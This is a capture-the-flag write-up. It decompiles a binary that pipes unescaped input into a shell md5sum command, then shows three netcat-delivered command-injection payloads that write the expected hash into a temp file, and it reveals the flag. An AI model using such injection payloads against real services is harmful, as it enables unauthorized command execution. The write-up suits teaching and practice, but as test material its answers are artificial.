#### Challenge:

Hashes.. `nc 54.225.38.91 1025` [main](./main ":ignore")

---

#### Solution:

- decompile with ghidra

```c
void main(void)
{
  int iVar1;
  char local_459;
  char local_458 [1040];
  undefined local_48 [47];
  char local_19;
  char *local_18;
  FILE *local_10;

  setvbuf(stdout,(char *)0x0,2,0);
  __isoc99_scanf("%32s",local_48);
  sprintf(&local_459,"echo -n \'%s\'|md5sum",local_48);
  local_10 = popen(&local_459,"r");
  if (local_10 == (FILE *)0x0) {
    puts("Failed to run command");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_458,0x21,local_10);
  local_18 = "3b9aafa12aceeccd29a154766194a964";
  iVar1 = memcmp(local_458,"3b9aafa12aceeccd29a154766194a964",0x20);
  local_19 = (char)iVar1;
  if (local_19 == '\0') {
    system("cat flag");
  }
  else {
    puts("not good enough");
  }
  return;
}
```

- input of `32` bytes is passed via shell to `md5sum` and compared agains hash `3b9aafa12aceeccd29a154766194a964`, however there is no escaping of input
- we can escape `md5sum` part with comment a inject hash directly, however we need to do it without space and in 32 bytes...

```bash
echo "3b9aafa12aceeccd'>/tmp/f;#" | nc 54.225.38.91 1025
echo "29a154766194a964'>>/tmp/f;#" | nc 54.225.38.91 1025
echo "';cat</tmp/f;#" | nc 54.225.38.91 1025
```

---

<details><summary>FLAG:</summary>

```
securinets{memcmp_turned_out_to_be_shame_shame_shame!!}
```

</details>
<br/>
